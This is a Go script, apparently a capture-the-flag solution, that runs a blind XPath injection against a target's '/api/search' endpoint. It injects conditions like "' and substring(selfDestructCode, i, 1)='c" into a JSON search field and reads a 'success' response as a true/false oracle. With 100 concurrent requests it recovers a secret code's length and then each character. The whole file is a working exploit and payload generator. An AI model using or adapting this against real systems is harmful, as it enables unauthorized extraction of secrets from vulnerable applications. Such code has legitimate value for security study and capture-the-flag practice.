package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"sync"

	"net/http"
)

const THREADS = 100

var guard = make(chan struct{}, THREADS)
var wg sync.WaitGroup
var baseUrl string
var flag []rune

func oracle(reqBody string) bool {
	guard <- struct{}{}

	req, _ := http.NewRequest("POST", baseUrl+"/api/search", bytes.NewBuffer([]byte(reqBody)))
	req.Header.Set("Content-Type", "application/json")

	res, err := (&http.Client{}).Do(req)

	if err != nil {
		<-guard
		return false
	}

	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)

	if err != nil {
		panic(err)
	}

	<-guard
	return bytes.Contains(body, []byte("success"))
}

func testLength(name string, length int) bool {
	reqBody := fmt.Sprintf(`{"search":"%s' and string-length(selfDestructCode)=%d and '1'='1"}`, name, length)

	return oracle(reqBody)
}

func testFlagCharacter(name string, b rune, index int) bool {
	reqBody := fmt.Sprintf(`{"search":"%s' and substring(selfDestructCode, %d, 1)='%c"}`, name, index, b)

	return oracle(reqBody)
}

func main() {
	baseUrl = "http://" + os.Args[1]
	chars := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&*+-.<=>?@_{}"

	firstName, secondName := "Groorg", "Bobhura"
	firstLength, secondLength := 1, 1

	for !testLength("Groorg", firstLength) {
		firstLength++
	}

	for !testLength("Bobhura", secondLength) {
		secondLength++
	}

	flag = make([]rune, firstLength+secondLength)

	for _, c := range chars {
		for i := 1; i <= firstLength; i++ {
			wg.Add(1)

			go func(b rune, index int) {
				defer wg.Done()

				if flag[index-1] == 0 && testFlagCharacter(firstName, b, index) {
					flag[index-1] = b
				}
			}(c, i)
		}

		for i := firstLength + 1; i <= firstLength+secondLength; i++ {
			wg.Add(1)

			go func(b rune, index int) {
				defer wg.Done()

				if flag[index-1] == 0 && testFlagCharacter(secondName, b, index-firstLength) {
					flag[index-1] = b
				}
			}(c, i)
		}
	}

	wg.Wait()

	fmt.Println(string(flag))
}
